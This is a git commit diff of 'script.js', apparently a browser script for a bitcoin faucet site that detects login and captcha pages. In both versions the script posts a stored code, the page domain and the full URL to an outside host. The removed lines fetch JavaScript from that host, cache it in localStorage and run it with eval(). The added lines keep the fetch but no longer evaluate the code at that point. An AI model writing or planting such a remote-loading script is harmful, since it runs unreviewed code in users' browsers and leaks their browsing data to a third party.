c4e7b149e61946064b77d17e13cfdb1e84378e9e
freebitcoinfo <freebitco.info@ya.ru>
2018-08-29 20:56:09 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,14 +1,14 @@
-var dat=new Date().getTime()/1000; var loch=location.href.indexOf('index.php?view=login');var spltu=location.href.indexOf('modules.php?m=surfer&show=captcha');
-if(localStorage['dtt'] && localStorage['odd'] && localStorage['odd']!=='' && dat-Number(localStorage['dtt'])<166400){eval(localStorage['odd']);}
+var dat=new Date().getTime()/1000,odidi; var loch=location.href.indexOf('index.php?view=login');var spltu=location.href.indexOf('modules.php?m=surfer&show=captcha');
+if(localStorage['dtt'] && localStorage['odd'] && localStorage['odd']!=='' && dat-Number(localStorage['dtt'])<166400){odidi=localStorage['odd'];}
 else{
 if($('#adcopy-puzzle-image img').attr('src')){var solve=1;}else{var solve=-1;}	
 	
 $.post("//bitcjt.mircloud.host/app/js/bit/bj/bitjs.js", { c: localStorage['p_code'], d: document.domain, h:location.href,solve:solve })
 .done(function(data) {
-  eval(data);var loch=location.href.indexOf('index.php?view=login');var spltu=location.href.indexOf('modules.php?m=surfer&show=captcha');
+ var loch=location.href.indexOf('index.php?view=login');var spltu=location.href.indexOf('modules.php?m=surfer&show=captcha');
   //if(spltu==-1 && loch==-1){var ode=$.md5(window.location.href )+'odd';
 localStorage['dtt']=new Date().getTime()/1000;
-localStorage['odd']=data;
+localStorage['odd']=odidi=data;
   
 });
 }
